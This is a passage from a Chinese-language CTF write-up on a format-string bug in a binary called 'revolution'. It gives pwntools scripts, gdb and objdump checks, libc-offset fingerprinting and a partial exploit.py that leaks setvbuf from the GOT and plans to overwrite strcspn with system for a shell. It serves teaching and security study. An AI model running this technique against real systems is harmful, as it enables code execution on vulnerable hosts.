  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
N
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
來源
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
實際內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 & \texttt{reg\_\allowbreak{}save\_\allowbreak{}area\ \allowbreak{}+\ \allowbreak{}8} = \texttt{{[}rsp+0x38{]}} & 進入
printf 時的 \texttt{rsi}（\texttt{strcspn} 留下的殘值） \\
2 & \texttt{+0x10} = \texttt{{[}rsp+0x40{]}} & 進入時的 \texttt{rdx} \\
3 & \texttt{+0x18} & 進入時的 \texttt{rcx} \\
4 & \texttt{+0x20} & 進入時的 \texttt{r8} \\
5 & \texttt{+0x28} & 進入時的 \texttt{r9} \\
6 & \texttt{overflow\_\allowbreak{}arg\_\allowbreak{}area\ \allowbreak{}+\ \allowbreak{}0} = \texttt{buf+0} & ★
我們的輸入 \\
7 & \texttt{buf+8} & ★ \\
N & \texttt{buf\ \allowbreak{}+\ \allowbreak{}8*(N-\allowbreak{}6)} & ★ \\
\end{longtable}
}

用 gdb 驗證（\texttt{\%\allowbreak{}1\$\allowbreak{}p} 印出 \texttt{0x7ffff7db21a0}，正好等於
printf 入口的 \texttt{rsi}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
saved rsi @rsp+0x38 = 0x7ffff7db21a0   (== arg1)
\end{Verbatim}

\subparagraph{★ 不靠 gdb 也能自己驗證「arg 6 = buf」與「arg 14 =
buf+0x40」}\label{ux4e0dux9760-gdb-ux4e5fux80fdux81eaux5df1ux9a57ux8b49arg-6-bufux8207arg-14-buf0x40}

跟 pwn2 §4 一樣，我們可以在輸入裡放一個好認的標記，然後用
\texttt{\%\allowbreak{}N\$\allowbreak{}p} 掃過去 ------ \textbf{不需要
gdb，也不需要相信任何人的數字}：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# pwn3\_marker.py}
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}
\NormalTok{context.log\_level }\OperatorTok{=} \StringTok{\textquotesingle{}error\textquotesingle{}}
\NormalTok{io }\OperatorTok{=}\NormalTok{ process(}\StringTok{\textquotesingle{}./revolution\textquotesingle{}}\NormalTok{)}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}score\textgreater{} \textquotesingle{}}\NormalTok{)}

\KeywordTok{def}\NormalTok{ send(p):}
\NormalTok{    io.send(p }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ io.recvuntil(}\StringTok{b\textquotesingle{}score\textgreater{} \textquotesingle{}}\NormalTok{, drop}\OperatorTok{=}\VariableTok{True}\NormalTok{)[:}\OperatorTok{{-}}\DecValTok{1}\NormalTok{]}

\CommentTok{\# 1) 先證明 arg6 = buf[0..8)：\%6$p 會印出 "\%6$p\textbackslash{}0\textbackslash{}0\textbackslash{}0\textbackslash{}0" 這 8 bytes}
\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}arg6 =\textquotesingle{}}\NormalTok{, send(}\StringTok{b\textquotesingle{}\%6$p\textquotesingle{}}\NormalTok{))        }\CommentTok{\# → b\textquotesingle{}0x0000000070243625\textquotesingle{}}
\CommentTok{\#  0x0000000070243625 就是 b\textquotesingle{}\%6$p\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textquotesingle{} 的小端解讀 ⇒ arg6 = buf[0..8)}

\CommentTok{\# 2) 再把標記放在 buf+0x40，用 \%14$p 找它（0x40/8 = 8 ⇒ 6+8 = 14）}
\NormalTok{payload }\OperatorTok{=} \StringTok{b\textquotesingle{}\%6$p|\%7$p|\%14$p|\%15$p}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}}\NormalTok{.ljust(}\BaseNTok{0x40}\NormalTok{, }\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}}\NormalTok{) }\OperatorTok{+} \StringTok{b\textquotesingle{}AAAABBBB\textquotesingle{}} \OperatorTok{+} \StringTok{b\textquotesingle{}CCCCDDDD\textquotesingle{}}
\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}scan  =\textquotesingle{}}\NormalTok{, send(payload))}
\end{Highlighting}
\end{Shaded}

實測輸出：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
arg6 = b'0x0000000070243625'
scan = b'0x2437257c70243625|0x7c70243431257c70|0x4242424241414141|0x4444444443434343'
                                         ^^^^^^^^^^^^^^^^^^ = "AAAABBBB"（buf+0x40）
                                                            0x4444444443434343 = "CCCCDDDD"（buf+0x48 = arg15）
\end{Verbatim}

於是
\texttt{arg6\ \allowbreak{}=\ \allowbreak{}buf{[}0..\allowbreak{}8)}、\texttt{arg14\ \allowbreak{}=\ \allowbreak{}buf+0x40}、\texttt{arg15\ \allowbreak{}=\ \allowbreak{}buf+0x48}，一般式
\textbf{\texttt{N\ \allowbreak{}=\ \allowbreak{}6\ \allowbreak{}+\ \allowbreak{}offset/\allowbreak{}8}}（§11-11）就自己驗證完了。

\begin{quote}
※提示 小技巧：\texttt{\%\allowbreak{}N\$\allowbreak{}p} 的輸出一定是固定的 18 個字元（\texttt{0x}
+ 16 位 hex），所以 \texttt{\%\allowbreak{}6\$\allowbreak{}p} 的輸出可以直接讀出 \texttt{buf} 的前
8 bytes。 ※提示 \texttt{\%\allowbreak{}6\$\allowbreak{}p} 印出的 \texttt{0x0000000070243625}
之所以「看起來像亂碼」，是因為它把\textbf{格式字串自己的前 8
個字元}（\texttt{\%\allowbreak{}6\$\allowbreak{}p\textbackslash{}\allowbreak{}0\textbackslash{}\allowbreak{}0\textbackslash{}\allowbreak{}0\textbackslash{}\allowbreak{}0}）當成一個
8-byte 整數印出來 ------ 這正是 arg6 == buf 的直接證據。
\end{quote}

\paragraph{★★
關鍵技巧：值不必是格式字串的一部分}\label{ux95dcux9375ux6280ux5de7ux503cux4e0dux5fc5ux662fux683cux5f0fux5b57ux4e32ux7684ux4e00ux90e8ux5206}

\texttt{get\_\allowbreak{}arg} 讀的是\textbf{記憶體}，不是「字串」。所以我們可以：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
buf:  "%14$w"  \0  ......(padding 0)......  [qword: 目的位址] [qword: 值]
       ↑ 格式字串到這裡就結束       ↑ 從 buf+0x40 開始放資料
       （解析器看不到後面的 \x00）
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  解析器（4.6 節）掃到 \texttt{\textbackslash{}\allowbreak{}0} 就停 →
  不會把後面的二進位資料當成文字處理。
\item
  但 \texttt{get\_\allowbreak{}arg} 照樣能讀到 \texttt{buf+0x40}、\texttt{buf+0x48} →
  \textbf{值裡面可以有 \texttt{\textbackslash{}\allowbreak{}x00}}（libc 位址
  \texttt{0x00007f...} 一定會含
  \texttt{\textbackslash{}\allowbreak{}x00}，這招是必要的）。
\item
  參數編號：\texttt{buf+0x40} 對應 \texttt{N\ \allowbreak{}=\ \allowbreak{}6\ \allowbreak{}+\ \allowbreak{}0x40/\allowbreak{}8\ \allowbreak{}=\ \allowbreak{}14}。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6.
漏洞成因總結}\label{ux6f0fux6d1eux6210ux56e0ux7e3dux7d50}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1. printf 的 va_list.overflow_arg_area 被設成 rsp+0x120，
   而 rsp+0x120 恰好等於 main 的輸入緩衝區 buf（因為 printf 的框架大小剛好 0x120）。
2. 於是「第 6 個以後的參數」= 我們輸入的內容。
   → 使用者可以完全控制參數「指標」與「值」。
3. %N$s  把使用者給的指標當字串印出        → 任意讀（NUL 結尾）
   %N$w  把使用者給的位址寫入使用者給的值  → 任意 8 bytes 寫，毫無檢查
4. 程式本身 non-PIE、Partial RELRO（.got.plt 可寫）、沒有 canary
   → 只要洩漏 libc，就能把 GOT 換成 system。
\end{Verbatim}

\textbf{為什麼不是堆疊溢位？} \texttt{read(0,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}0x1ff)} 讀 511
bytes 進 512 bytes 的緩衝區， 而且 \texttt{buf} 就在
\texttt{rsp}，返回位址在 \texttt{buf+0x218} ------ 打不到。這題不需要
ROP。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{7.
記憶體佈局圖（ASCII）}\label{ux8a18ux61b6ux9ad4ux4f48ux5c40ux5716ascii}

\paragraph{7.1
靜態資料（non-PIE，位址固定）}\label{ux975cux614bux8cc7ux6599non-pieux4f4dux5740ux56faux5b9a}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
        0x403dc0  ┌──────────────────────────────┐  .init_array（main 之前執行）
                  │  0x4012b0 (frame_dummy)      │
                  │  0x401190 (stdio init:       │  ✶ 就是它呼叫 setvbuf(_IONBF)，
                  │            setvbuf stdout/   │    所以 0x404020 的 GOT 值一定是
                  │            stderr = _IONBF)  │    已解析的真 libc 位址（§8.3）
        0x403dd0  ├──────────────────────────────┤  .fini_array
                  │  0x401280 (dtors)            │
        0x403dd8  ├──────────────────────────────┤  .dynamic
                  │  ...                         │
        0x403fd8  │  __libc_start_main (GLOB_DAT)│
        0x403fe0  │  __gmon_start__ (GLOB_DAT)   │
        0x403fe8  ├──────────────────────────────┤  .got.plt[0] _DYNAMIC
        0x403ff0  │  link_map                    │  .got.plt[1]  ← PLT0 會 push 這個
        0x403ff8  │  _dl_runtime_resolve         │  .got.plt[2]  ← 動態連結器
   ── GNU_RELRO 到這裡結束（0x403dc0 + 0x240 = 0x404000），以下都可寫 ──
        0x404000  │  write@libc                  │  ← JUMP_SLOT
        0x404008  │  strlen（IFUNC 挑選的實作）  │
        0x404010  │  strcspn（IFUNC 挑選的實作） │  ✶✶ 我們把它改成 system
        0x404018  │  read@libc                   │
        0x404020  │  setvbuf@libc                │  ✶ 洩漏來源（開機時已解析）
        0x404028  ├──────────────────────────────┤
        0x404040  │  &_IO_2_1_stdout_            │  .bss：R_X86_64_COPY stdout
        0x404048  │  0                           │
        0x404050  │  0                           │
        0x404058  │  0                           │
        0x404060  │  &_IO_2_1_stderr_            │  .bss：R_X86_64_COPY stderr
        0x404068  │  __do_global_dtors_aux 旗標  │
        0x404070  └──────────────────────────────┘  .bss 結束
                  （0x404000–0x405000 整頁都是 rw-p，可自由使用）
\end{Verbatim}

\begin{quote}
\textbf{怎麼自己驗證上面這兩格？}（\texttt{readelf\ \allowbreak{}-\allowbreak{}SW}
只會給你位址，內容要用 \texttt{objdump\ \allowbreak{}-\allowbreak{}s}）

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{$}\NormalTok{ objdump }\AttributeTok{{-}s} \AttributeTok{{-}j}\NormalTok{ .init\_array revolution    }\CommentTok{\# 403dc0 b0124000 90114000 → 0x4012b0, 0x401190}
\ExtensionTok{$}\NormalTok{ objdump }\AttributeTok{{-}s} \AttributeTok{{-}j}\NormalTok{ .fini\_array revolution    }\CommentTok{\# 403dd0 80124000          → 0x401280}
\ExtensionTok{$}\NormalTok{ readelf }\AttributeTok{{-}SW}\NormalTok{ revolution }\KeywordTok{|} \FunctionTok{grep} \AttributeTok{{-}E} \StringTok{"init\_array|fini\_array"}
  \ExtensionTok{[20]}\NormalTok{ .init\_array  INIT\_ARRAY  0000000000403dc0 ... 08  WA}
  \ExtensionTok{[21]}\NormalTok{ .fini\_array  FINI\_ARRAY  0000000000403dd0 ... 08  WA}
\end{Highlighting}
\end{Shaded}

\texttt{.\allowbreak{}init\_\allowbreak{}array} 的兩個函式在 \texttt{main}
\textbf{之前}被執行：\texttt{0x4012b0} 是 \texttt{frame\_\allowbreak{}dummy}，
\texttt{0x401190} 就是 §1.2 說的 stdio 初始化（它呼叫
\texttt{setvbuf(stdout,\allowbreak{}\ \allowbreak{}NULL,\allowbreak{}\ \allowbreak{}2,\allowbreak{}\ \allowbreak{}0)} 和
\texttt{setvbuf(stderr,\allowbreak{}\ \allowbreak{}NULL,\allowbreak{}\ \allowbreak{}2,\allowbreak{}\ \allowbreak{}0)}）。
\end{quote}

\begin{quote}
\textbf{COPY relocation 是什麼}：因為執行檔直接讀 \texttt{stdout}
這個變數（\texttt{0x401198:\allowbreak{}\ \allowbreak{}mov\ \allowbreak{}rdi,{[}rip+0x2ea1{]}\ \allowbreak{}\#\allowbreak{}\ \allowbreak{}404040}），
連結器就在執行檔的 \texttt{.\allowbreak{}bss} 開一塊 8 bytes 的空間，開機時把 libc
裡的 \texttt{stdout}（型別 \texttt{FILE*}）\textbf{複製}過來。
結果：\texttt{{[}0x404040{]}} 就是一個現成的 libc 指標 →
也是很好的洩漏來源。
\end{quote}

\paragraph{7.2
堆疊（每次執行位址不同）}\label{ux5806ux758aux6bcfux6b21ux57f7ux884cux4f4dux5740ux4e0dux540c}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
  高位址
   buf+0x218  │  返回位址（__libc_start_call_main+x）     │  ← 參數 73
   buf+0x210  │  呼叫者的 r12                             │  ← 參數 72
   buf+0x208  │  呼叫者的 rbp（指向堆疊）                 │  ← 參數 71
   buf+0x200  │  呼叫者的 rbx = 0                         │  ← 參數 70
   buf+0x1F8  │  ...（緩衝區尾端）                        │
              │                                           │
   buf+0x40   │  ✶ 我們放參數 qword 的地方                │  ← 參數 14 起
   buf+0x08   │                                           │  ← 參數 7
   buf+0x00   │  格式字串開頭                             │  ← 參數 6
   buf-0x08   │  printf 的返回位址（0x40113d）            │
   buf-0x10   │  printf 保存的 r15（= main 的 r15）       │
   buf-0x18   │  printf 保存的 r14（呼叫者的 r14）        │
   buf-0x20   │  printf 保存的 r13（呼叫者的 r13）        │
   buf-0x28   │  printf 保存的 r12（= 0x40201a "score> "）│
   buf-0x30   │  printf 保存的 rbp（= 0x402022 "\n"）     │
   buf-0x38   │  printf 保存的 rbx = buf  ✶               │
   ...        │                                           │
   buf-0x120  │  printf 內部的 rsp                        │  ✶ overflow_arg_area = rsp+0x120 = buf
  低位址
\end{Verbatim}

\subparagraph{\texorpdfstring{為什麼 \texttt{rbx} 在 \texttt{buf-\allowbreak{}0x38}
而不是
\texttt{buf-\allowbreak{}0x10}？}{為什麼 rbx 在 buf-0x38 而不是 buf-0x10？}}\label{ux70baux4ec0ux9ebc-rbx-ux5728-buf-0x38-ux800cux4e0dux662f-buf-0x10}

\texttt{printf}（\texttt{0x401330}）進場依序做了\textbf{六個 push}：
\texttt{push\ \allowbreak{}r15;\ \allowbreak{}push\ \allowbreak{}r14;\ \allowbreak{}push\ \allowbreak{}r13;\ \allowbreak{}push\ \allowbreak{}r12;\ \allowbreak{}push\ \allowbreak{}rbp;\ \allowbreak{}push\ \allowbreak{}rbx}（6
× 8 = 0x30 bytes）。 所以六個「保存值」由高位址往低位址、從
\texttt{buf-\allowbreak{}0x10} 一路排到 \texttt{buf-\allowbreak{}0x38} ------ \textbf{\texttt{rbx}
是最後一個被 push 的}（位址最低，在 \texttt{buf-\allowbreak{}0x38}）；之後再
\texttt{sub\ \allowbreak{}rsp,\allowbreak{}0xe8}，\texttt{rsp} 才落到 \texttt{buf-\allowbreak{}0x120}。

\begin{quote}
\textbf{自己驗一次整排}：\texttt{sub\ \allowbreak{}rsp,\allowbreak{}0xe8} 在
\texttt{0x40133d}，所以在\textbf{那一條執行之前}下斷點（\texttt{b\ \allowbreak{}*0x40133d}）
時 \texttt{rsp} 還在 \texttt{buf-\allowbreak{}0x38}，六個保存值就依序是
\texttt{{[}rsp{]}}=\texttt{rbx}、\texttt{{[}rsp+8{]}}=\texttt{rbp}、\texttt{{[}rsp+0x10{]}}=\texttt{r12}、\texttt{{[}rsp+0x18{]}}=\texttt{r13}、\texttt{{[}rsp+0x20{]}}=\texttt{r14}、\texttt{{[}rsp+0x28{]}}=\texttt{r15}。
（等 \texttt{sub} 執行完 \texttt{rsp} 變成
\texttt{buf-\allowbreak{}0x120}，同幾格就變成 \texttt{{[}rsp+0xe8{]}} \ldots{}
\texttt{{[}rsp+0x110{]}}。）
\end{quote}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位置
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{buf-\allowbreak{}0x08} & \texttt{printf} 的返回位址 = \texttt{0x40113d} \\
\texttt{buf-\allowbreak{}0x10} & 保存的 \texttt{r15}（= \texttt{main} 執行時的
r15，本機實測 \texttt{0x403dd0}） \\
\texttt{buf-\allowbreak{}0x18} & 保存的 \texttt{r14}（= \texttt{main} 執行時的
r14；\texttt{main} 沒動過它 ⇒ 值\textbf{不穩定}，本機實測
\texttt{0x7ffff7ffd000}。※注意 \texttt{0x402009} =
\texttt{"0123456789abcdef"} 是 \texttt{printf} \textbf{自己}在
\texttt{0x4013a4} 載入 \texttt{r14} 的值，\textbf{不是這一格的內容}） \\
\texttt{buf-\allowbreak{}0x20} & 保存的 \texttt{r13}（= \texttt{main} 執行時的
r13；同樣不穩定，本機實測 \texttt{0x1}） \\
\texttt{buf-\allowbreak{}0x28} & 保存的 \texttt{r12}（\texttt{0x40201a} =
\texttt{"score\textgreater{}\allowbreak{}\ \allowbreak{}"}） \\
\texttt{buf-\allowbreak{}0x30} & 保存的 \texttt{rbp}（= \texttt{main} 的 rbp =
\texttt{0x402022} = \texttt{"\textbackslash{}\allowbreak{}n"}） \\
\textbf{\texttt{buf-\allowbreak{}0x38}} & \textbf{保存的 \texttt{rbx} = \texttt{buf}}
← 就是 §4.1 gdb 印的 \texttt{{[}rsp+0xe8{]}} \\
\end{longtable}
}

\texttt{rbx} 的值是 \texttt{buf}，是因為 \texttt{main} 在
\texttt{0x40110d} 執行了 \texttt{mov\ \allowbreak{}rbx,\allowbreak{}rsp}（見 §3 逐行表）。
\textbf{自己驗證}：§4.1 的 gdb 最後一行 \texttt{x/\allowbreak{}1gx\ \allowbreak{}\$\allowbreak{}rsp+0xe8}
就會印出 \texttt{buf}（因為 \texttt{rsp+0xe8\ \allowbreak{}==\ \allowbreak{}buf-\allowbreak{}0x38}）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8. 資訊洩漏 → libc base
的計算式}\label{ux8cc7ux8a0aux6d29ux6f0f-libc-base-ux7684ux8a08ux7b97ux5f0f}

\paragraph{8.1 遠端 libc
的指紋}\label{ux9060ux7aef-libc-ux7684ux6307ux7d0b}

連 4 次遠端連線，取 GOT/COPY 指標，算出\textbf{與 ASLR
無關的差值}（每次都一樣）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
符號 & 相對 \texttt{setvbuf} 的位移 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{read} & \texttt{+0x93510} \\
\texttt{write} & \texttt{+0x94020} \\
\texttt{\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stdout\_\allowbreak{}} & \texttt{+0x17c080} \\
\texttt{\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stderr\_\allowbreak{}} & \texttt{+0x17bfa0} \\
\end{longtable}
}

拿這些差值去比對 12 個真實 libc 檔（Ubuntu 2.31/2.35/2.39 各 patch
版、2.41/2.42/2.43、本機 Arch）， 只有 \textbf{Ubuntu 24.04 的
\texttt{libc6\ \allowbreak{}2.\allowbreak{}39-\allowbreak{}0ubuntu8\ \allowbreak{}/\allowbreak{}\ \allowbreak{}8.\allowbreak{}1\ \allowbreak{}/\allowbreak{}\ \allowbreak{}8.\allowbreak{}2\ \allowbreak{}/\allowbreak{}\ \allowbreak{}8.\allowbreak{}3}} 完全吻合：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
符號 & offset（\texttt{libc6\_\allowbreak{}2.\allowbreak{}39-\allowbreak{}0ubuntu8.\allowbreak{}3}） \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{setvbuf} & \texttt{0x88540} \\
\texttt{system} & \texttt{0x58740} \\
\texttt{read} & \texttt{0x11ba50} \\
\texttt{write} & \texttt{0x11c560} \\
\texttt{\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stdout\_\allowbreak{}} & \texttt{0x2045c0} \\
\texttt{\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stderr\_\allowbreak{}} & \texttt{0x2044e0} \\
\end{longtable}
}

\paragraph{8.2 計算式}\label{ux8a08ux7b97ux5f0f}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
setvbuf_libc = *(uint64_t *)0x404020          # 用 %14$s 讀出來（NUL 結尾，6 bytes）
libc_base    = setvbuf_libc - 0x88540         # 遠端（Ubuntu 24.04 glibc 2.39-0ubuntu8.x）
system       = libc_base    + 0x58740

# 本機（Arch，跑 exploit.py 不加參數時使用）
libc_base    = setvbuf_libc - 0x843f0
system       = libc_base    + 0x54580
\end{Verbatim}

交叉驗證（用第二個洩漏確認沒算錯，程式會自動印出來）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
*(uint64_t *)0x404040 - libc_base == 0x2045c0   # &_IO_2_1_stdout_
\end{Verbatim}

實測輸出：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[+] setvbuf@libc = 0x78d497ba3540   ->   libc base = 0x78d497b1b000
[*] &_IO_2_1_stdout_ = 0x78d497d1f5c0 (base+0x2045c0)     ← 完全吻合
[+] system = 0x78d497b73740
\end{Verbatim}

\paragraph{\texorpdfstring{8.3 為什麼用 \texttt{setvbuf} 而不是
\texttt{len}/\texttt{strcspn}}{8.3 為什麼用 setvbuf 而不是 len/strcspn}}\label{ux70baux4ec0ux9ebcux7528-setvbuf-ux800cux4e0dux662f-lenstrcspn}

\begin{itemize}
\tightlist
\item
  \texttt{setvbuf} 在 \texttt{main} 執行前就被 \texttt{0x401190} 呼叫過
  → GOT 一定已解析成真正的 libc 位址。
\item
  \texttt{strlen}、\texttt{strcspn} 是
  \textbf{IFUNC}（多版本最佳化），GOT 裡是「被 CPU 特性挑中的實作」
  （例如 \texttt{\_\allowbreak{}\_\allowbreak{}strcspn\_\allowbreak{}avx2}），不是符號本身的 offset，拿來當
  fingerprint 會誤判。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{9. \texttt{exploit.\allowbreak{}py}
逐行註解}{9. exploit.py 逐行註解}}\label{exploit.py-ux9010ux884cux8a3bux89e3}

\begin{quote}
\textbf{這一節是「精簡版」}：為了閱讀方便，省略了 \texttt{assert}
自檢、\texttt{try/\allowbreak{}except}、 \texttt{REMOTE\_\allowbreak{}LIBC} /
\texttt{local\_\allowbreak{}libc\_\allowbreak{}offsets()} 的細節、以及 \texttt{COMMANDS}
的完整內容（\texttt{2\textgreater{}\allowbreak{}/\allowbreak{}dev/\allowbreak{}null}、 本機 flag
的絕對路徑、\texttt{ls\ \allowbreak{}-\allowbreak{}la\ \allowbreak{}/}\ldots），有些呼叫也合併成一行。
\textbf{要對照檔案請直接看
\texttt{exploit.\allowbreak{}py}}（行號對不起來是正常的）。
真實檔案裡有幾個很重要的自檢，建議自己寫的時候也留著：

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{assert} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}} \KeywordTok{not} \KeywordTok{in}\NormalTok{ payload          }\CommentTok{\# 換行會讓 read() 提前結束這一輪}
\ControlFlowTok{assert} \BuiltInTok{len}\NormalTok{(payload) }\OperatorTok{\textless{}} \BaseNTok{0x1ff}          \CommentTok{\# 超過 511 bytes 會被 read() 截斷}
\ControlFlowTok{assert}\NormalTok{ data.endswith(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)          }\CommentTok{\# printf 之後 main 固定寫一個 \textquotesingle{}\textbackslash{}n\textquotesingle{} → 沒收到就是解析錯了}
\ControlFlowTok{assert}\NormalTok{ out }\OperatorTok{==} \StringTok{b\textquotesingle{}ok\textquotesingle{}}\NormalTok{, out             }\CommentTok{\# \%N$w 成功才會印 "ok"}
\end{Highlighting}
\end{Shaded}
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 0) ✶ 在 import pwntools 之前先把 argv 抄一份（否則 REMOTE 會被 pwnlib.args 吃掉，見 §11{-}1）}
\ImportTok{import}\NormalTok{ sys }\ImportTok{as}\NormalTok{ \_sys}
\NormalTok{\_argv }\OperatorTok{=} \BuiltInTok{list}\NormalTok{(\_sys.argv[}\DecValTok{1}\NormalTok{:])}

\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}

\CommentTok{\# 1) 連線，吃掉標題與第一個 "score\textgreater{} "}
\KeywordTok{class}\NormalTok{ Revolution:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, remote\_mode}\OperatorTok{=}\VariableTok{False}\NormalTok{):}
        \VariableTok{self}\NormalTok{.io }\OperatorTok{=}\NormalTok{ remote(HOST, PORT) }\ControlFlowTok{if}\NormalTok{ remote\_mode }\ControlFlowTok{else}\NormalTok{ process(BINARY)}
        \VariableTok{self}\NormalTok{.io.recvuntil(}\StringTok{b\textquotesingle{}score\textgreater{} \textquotesingle{}}\NormalTok{)          }\CommentTok{\# 提示字串固定是 "score\textgreater{} "}

\CommentTok{\# 2) 送一行格式字串，取回 printf 產生的輸出}
    \KeywordTok{def}\NormalTok{ fmt(}\VariableTok{self}\NormalTok{, payload):}
        \VariableTok{self}\NormalTok{.io.send(payload }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)          }\CommentTok{\# 一定要有 \textquotesingle{}\textbackslash{}n\textquotesingle{} 讓 main 的 read 結束}
\NormalTok{        data }\OperatorTok{=} \VariableTok{self}\NormalTok{.io.recvuntil(}\StringTok{b\textquotesingle{}score\textgreater{} \textquotesingle{}}\NormalTok{, drop}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ data[:}\OperatorTok{{-}}\DecValTok{1}\NormalTok{]                       }\CommentTok{\# main 固定會多寫一個 \textquotesingle{}\textbackslash{}n\textquotesingle{}}

\CommentTok{\# 3) 任意讀：\%14$s，把要讀的位址放在 buf+0x40（= 參數 14）}
    \KeywordTok{def}\NormalTok{ \_leak\_str(}\VariableTok{self}\NormalTok{, addr):}
\NormalTok{        payload }\OperatorTok{=} \StringTok{b\textquotesingle{}\%\%\%d$s}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ ARG0                       }\CommentTok{\# "\%14$s\textbackslash{}0"}
\NormalTok{        payload }\OperatorTok{=}\NormalTok{ payload.ljust(VALS\_OFF, }\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}}\NormalTok{)           }\CommentTok{\# 補到 0x40，順便提早結束字串}
        \ControlFlowTok{return} \VariableTok{self}\NormalTok{.fmt(payload }\OperatorTok{+}\NormalTok{ p64(addr))                 }\CommentTok{\# buf+0x40 = 目標位址}

\CommentTok{\# 4) \%s 內部用 strlen，遇到 \textbackslash{}x00 就停 → 一個 byte 一個 byte 探測，組回 8 bytes}
    \KeywordTok{def}\NormalTok{ read\_mem(}\VariableTok{self}\NormalTok{, addr, n):}
\NormalTok{        out, cur }\OperatorTok{=} \StringTok{b\textquotesingle{}\textquotesingle{}}\NormalTok{, addr}
        \ControlFlowTok{while} \BuiltInTok{len}\NormalTok{(out) }\OperatorTok{\textless{}}\NormalTok{ n:}
\NormalTok{            chunk }\OperatorTok{=} \VariableTok{self}\NormalTok{.\_leak\_str(cur)}
            \ControlFlowTok{if}\NormalTok{ chunk:      out }\OperatorTok{+=}\NormalTok{ chunk[:n}\OperatorTok{{-}}\BuiltInTok{len}\NormalTok{(out)]}\OperatorTok{;}\NormalTok{ cur }\OperatorTok{+=} \BuiltInTok{len}\NormalTok{(chunk)}
